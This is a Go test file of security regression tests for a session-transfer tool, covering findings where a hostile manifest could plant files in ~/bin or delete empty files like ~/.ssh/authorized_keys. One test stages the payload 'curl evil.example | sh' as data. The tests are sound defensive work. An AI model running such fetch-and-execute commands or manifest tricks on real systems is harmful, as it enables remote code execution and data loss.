package transfer

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mithro/go-claude-teleport/internal/session"
)

// Ruling R-P3-B1f PoCs for the two transfer-side findings: N2 (Root.
// MayPreExist was a source-set bit that re-enabled insertion into any
// populated non-dot directory under $HOME) and N3 (deletion was gated by
// sha256 equality alone, so any empty file — or any empty directory the
// manifest named — under $HOME could be deleted).

// sessionEntryFor builds the CatSession transcript entry a manifest for a
// session launched in cwd really carries: <ConfigDir>/projects/<Munge(cwd)>
// /<sid>.jsonl.
func sessionEntryFor(id int, p session.Paths, cwd, content string) Entry {
	return Entry{
		ID: id, Category: session.CatSession,
		Dst:    filepath.Join(p.ProjectDir(cwd), sid+".jsonl"),
		Size:   int64(len(content)),
		Mode:   0o600,
		SHA256: sha(content),
	}
}

// TestInstallRefusesMayPreExistRootTheSessionDoesNotClaim is PoC N2: a
// hostile source sets MayPreExist on a Root that is one of the user's own
// populated directories (~/bin) while the session it is transporting was
// launched somewhere else entirely. MayPreExist exists for exactly one
// case — not-a-repo mode's destination cwd, which is the DRIVER's choice —
// so the destination now corroborates that claim against the manifest's
// own session entries (the transcript lives under
// projects/<Munge(cwd)>) instead of believing the bit.
func TestInstallRefusesMayPreExistRootTheSessionDoesNotClaim(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "bin")             // the user's own populated dir
	realCwd := filepath.Join(home, "work", "proj") // where the session actually ran
	writeFile(t, filepath.Join(root, "backup.sh"), "#!/bin/sh\nrsync …\n")
	transcript := `{"type":"user","sessionId":"` + sid + `"}` + "\n"
	stageFile(t, staging, 0, transcript)
	payload := "curl evil.example | sh\n"
	size, sum := stageFile(t, staging, 1, payload)
	evil := filepath.Join(root, "backup-helper.sh")
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid,
		Roots: []Root{{Path: root, MayPreExist: true}},
		Entries: []Entry{
			sessionEntryFor(0, p, realCwd, transcript),
			{ID: 1, Category: session.CatWorktree, Dst: evil, Size: size, Mode: 0o700, SHA256: sum},
		},
	}
	if err := installOrRefuse(t, m, staging, p); err == nil {
		t.Fatal("a MayPreExist root the session never claimed must be refused")
	}
	if _, err := os.Lstat(evil); !os.IsNotExist(err) {
		t.Errorf("%s was created (err %v)", evil, err)
	}
}

// TestInstallAcceptsMayPreExistRootTheSessionClaims is the same manifest
// with the session's own transcript placed under projects/<Munge(root)> —
// the shape a real not-a-repo teleport into a pre-existing destination cwd
// produces — which must still work.
func TestInstallAcceptsMayPreExistRootTheSessionClaims(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "work")
	writeFile(t, filepath.Join(root, "notes.txt"), "the user's own notes\n")
	transcript := `{"type":"user","sessionId":"` + sid + `"}` + "\n"
	stageFile(t, staging, 0, transcript)
	content := "package main\n"
	size, sum := stageFile(t, staging, 1, content)
	dst := filepath.Join(root, "main.go")
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid,
		Roots: []Root{{Path: root, MayPreExist: true}},
		Entries: []Entry{
			sessionEntryFor(0, p, root, transcript),
			{ID: 1, Category: session.CatWorktree, Dst: dst, Size: size, Mode: 0o644, SHA256: sum},
		},
	}
	if err := installOrRefuse(t, m, staging, p); err != nil {
		t.Fatalf("not-a-repo install into the session's own cwd: %v", err)
	}
	if got, err := os.ReadFile(dst); err != nil || string(got) != content {
		t.Fatalf("%s = %q err=%v", dst, got, err)
	}
}

// TestUninstallDeletesOnlyWhatThisJobInstalled is PoC N3: hash equality was
// the only gate, so a manifest naming any EMPTY file under $HOME (here
// ~/.ssh/authorized_keys, and a session-category file the destination
// merely happens to hold) with sha256 of "" got it deleted, and any empty
// directory the manifest listed was removed as an "emptied" install
// directory. Deletion now requires a record in this job's own
// jobs/<id>/installed.json.
func TestUninstallDeletesOnlyWhatThisJobInstalled(t *testing.T) {
	home, p, staging := pocHost(t)
	_ = staging
	// The user's own empty files and directories, none of them installed
	// by this job.
	ssh := filepath.Join(home, ".ssh")
	authorized := filepath.Join(ssh, "authorized_keys")
	writeFile(t, authorized, "")
	docs := filepath.Join(home, "Documents")
	if err := os.MkdirAll(docs, 0o755); err != nil {
		t.Fatal(err)
	}
	proj := p.ProjectDir(filepath.Join(home, "work"))
	stray := filepath.Join(proj, "stray.jsonl")
	writeFile(t, stray, "")

	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid,
		Roots: []Root{{Path: docs}, {Path: ssh}},
		Entries: []Entry{
			{ID: 0, Category: session.CatWorktree, Dst: authorized, Mode: 0o600, SHA256: sha("")},
			{ID: 1, Category: session.CatWorktree, Dst: docs, Mode: uint32(os.ModeDir | 0o755)},
			{ID: 2, Category: session.CatSession, Dst: stray, Mode: 0o600, SHA256: sha("")},
		},
	}
	removed, err := UninstallIDs(m, p, []int{0, 1, 2})
	if len(removed) != 0 {
		t.Errorf("UninstallIDs removed %v; it may only remove what this job's own install recorded (err %v)", removed, err)
	}
	for _, path := range []string{authorized, docs, stray} {
		if _, err := os.Lstat(path); err != nil {
			t.Errorf("%s was deleted: %v", path, err)
		}
	}
}

// TestUninstallRemovesThisJobsOwnInstall is N3's other half: what Install
// really placed (and recorded in jobs/<id>/installed.json) is still
// removed, directories it created included.
func TestUninstallRemovesThisJobsOwnInstall(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "github", "x")
	content := "package main\n"
	stageDir(t, staging, 0)
	size, sum := stageFile(t, staging, 1, content)
	dst := filepath.Join(root, "main.go")
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Roots: declRoots(root), Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: root, Mode: uint32(os.ModeDir | 0o755)},
		{ID: 1, Category: session.CatWorktree, Dst: dst, Size: size, Mode: 0o644, SHA256: sum},
	}}
	if err := installOrRefuse(t, m, staging, p); err != nil {
		t.Fatalf("install: %v", err)
	}
	removed, err := UninstallIDs(m, p, []int{0, 1})
	if err != nil {
		t.Fatalf("UninstallIDs: %v", err)
	}
	if !contains(removed, dst) || !contains(removed, root) {
		t.Errorf("removed = %v, want at least the installed file and the root this job created", removed)
	}
	for _, path := range []string{dst, root} {
		if _, err := os.Lstat(path); !os.IsNotExist(err) {
			t.Errorf("%s survived: %v", path, err)
		}
	}
}

// TestUninstallLeavesAnInstalledFileThatChangedSince keeps the pre-existing
// promise: a file this job installed but that has changed since is left
// alone (the recorded hash no longer matches).
func TestUninstallLeavesAnInstalledFileThatChangedSince(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "github", "x")
	stageDir(t, staging, 0)
	size, sum := stageFile(t, staging, 1, "package main\n")
	dst := filepath.Join(root, "main.go")
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Roots: declRoots(root), Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: root, Mode: uint32(os.ModeDir | 0o755)},
		{ID: 1, Category: session.CatWorktree, Dst: dst, Size: size, Mode: 0o644, SHA256: sum},
	}}
	if err := installOrRefuse(t, m, staging, p); err != nil {
		t.Fatalf("install: %v", err)
	}
	if err := os.WriteFile(dst, []byte("edited on the destination\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	removed, err := UninstallIDs(m, p, []int{0, 1})
	if err != nil {
		t.Fatalf("UninstallIDs: %v", err)
	}
	if strings.Join(removed, " ") != "" && contains(removed, dst) {
		t.Errorf("removed = %v, must not include the edited %s", removed, dst)
	}
	if _, err := os.Lstat(dst); err != nil {
		t.Errorf("%s was deleted after being edited: %v", dst, err)
	}
}

func contains(all []string, want string) bool {
	for _, s := range all {
		if s == want {
			return true
		}
	}
	return false
}
